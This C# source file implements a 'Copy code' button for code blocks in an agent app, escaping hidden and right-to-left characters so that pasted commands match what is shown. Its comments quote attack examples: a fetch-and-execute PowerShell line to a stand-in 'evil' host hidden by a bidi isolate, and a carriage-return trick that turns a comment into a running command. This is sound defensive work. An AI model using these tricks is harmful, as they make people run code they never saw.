namespace AgentBridge.App.Core;

// A code block's text and its Copy button (#296), as the PWA's (pwa/js/markdown.js codeBlock): what
// the block draws, what Copy puts on the clipboard (the same), and what Copy says afterwards. Copy
// takes every space, tab and line break as drawn, never the lines the text wraps into on screen: a
// long command pasted into a shell must be the one command it was.
//
// What is drawn is the agent's text with every character that is not on screen as it runs shown
// as an escape, right-to-left letters included (#220): a bidi isolate can draw
// `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
// download. So Copy takes the escapes too: a shell it is pasted into gets `\u2067` literally,
// never a command the person did not see.
public sealed class CodeCopy : Observable
{
    // The button's name stays this whatever it shows; what happened is announced separately.
    public const string Name = "Copy code";
    public const string Ready = "Copy";
    public const string Done = "Copied";
    public const string Failed = "Copy failed";
    public static readonly TimeSpan ResetAfter = TimeSpan.FromMilliseconds(1500);

    readonly Func<string, bool> put;
    readonly IUiDispatcher ui;
    readonly TimeProvider time;
    ITimer? reset;
    int copies;
    string label = Ready;

    // put: places text on the clipboard, false if the clipboard refused it (another program can
    // hold it open). Its timer's callback comes back through ui, on the UI thread in the app.
    public CodeCopy(MdCode code, Func<string, bool> put, IUiDispatcher? ui = null, TimeProvider? time = null)
    {
        Text = Drawn(code.Text);
        RightToLeft = HiddenText.HasRightToLeft(code.Text);
        Hidden = HiddenText.HasHidden(code.Text);
        this.put = put;
        this.ui = ui ?? InlineDispatcher.Instance;
        this.time = time ?? TimeProvider.System;
    }

    // What the block draws and Copy takes: revealed, and without the whitespace-only lines a fence
    // may end with, which draw as nothing and, pasted, would end the last line and run it. Trimming
    // only line breaks left `echo safe\n    ` copying its newline (#429). Spaces and tabs on the last
    // line with anything else on it stay, as they are part of it.
    public string Text { get; }

    // A code block's text as it is drawn, for Copy and for the name a screen reader is given (#765).
    public static string Drawn(string code) => WithoutTrailingBlankLines(HiddenText.Reveal(code, rightToLeft: true));

    // From the end, past whitespace back to the first line break with only whitespace after it; a
    // backward scan, as a regex trim backtracks quadratically over long runs of blank lines.
    static string WithoutTrailingBlankLines(string text)
    {
        var end = text.Length;
        for (var i = text.Length - 1; i >= 0; i--)
        {
            var c = text[i];
            if (c == '\n') { end = i; }
            else if (!char.IsWhiteSpace(c)) { break; }
        }
        return text[..end];
    }

    // Right-to-left letters reorder what is drawn around them with no control at all, so they are
    // escaped too (HiddenText.Reveal), and the block says it held them (RightToLeftNote).
    public bool RightToLeft { get; }
    public const string RightToLeftNote = "Contains right-to-left text";

    // Characters drawn as escapes (HiddenText.HasHidden), which the block says it held: an escape can
    // be read past, and its character still acts. PowerShell ends a `#` comment at a bare CR, so
    // `# just a note\u000D Write-Output RAN` on one line still reads as a comment, and runs.
    public bool Hidden { get; }
    public const string HiddenNote = "Contains hidden characters";

    public string Label { get => label; private set => Set(ref label, value); }

    public bool Copy()
    {
        bool ok;
        try { ok = put(Text); }
        catch (Exception e) when (e is System.Runtime.InteropServices.COMException or UnauthorizedAccessException) { ok = false; }
        Label = ok ? Done : Failed;
        reset?.Dispose();
        // Disposing the old timer can't recall a reset it already posted: each reset carries the
        // copy it belongs to, and one from an earlier copy leaves this copy's word showing.
        var copy = ++copies;
        reset = time.CreateTimer(_ => ui.Post(() => { if (copy == copies) { Label = Ready; } }), null, ResetAfter, Timeout.InfiniteTimeSpan);
        return ok;
    }
}
